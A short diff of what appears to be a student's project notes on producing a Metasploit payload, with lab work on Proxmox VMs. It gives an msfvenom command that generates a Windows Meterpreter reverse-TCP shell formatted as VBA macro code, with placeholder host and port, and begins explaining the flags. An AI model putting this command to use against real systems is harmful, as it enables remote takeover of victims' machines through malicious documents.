@@ -17,6 +17,7 @@ After adding Ben to the group a little later into the semester, I opened up the 
 # MSFVenom Payload  
 AI suggested using MSFVenom to create the payload and after looking into it, I realized that it was implemented in metasploite which we have experience with and acess to on our proxmox VMs. 
 This was the main website I used to research the flags and how to use them(reading the instruction in the terminal is a bit of a headache for me) https://www.offsec.com/metasploit-unleashed/msfvenom/  
+  
 Ultimately the command I came up with was msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f vba.  
 #### -p
 - the flag to start creating a payload
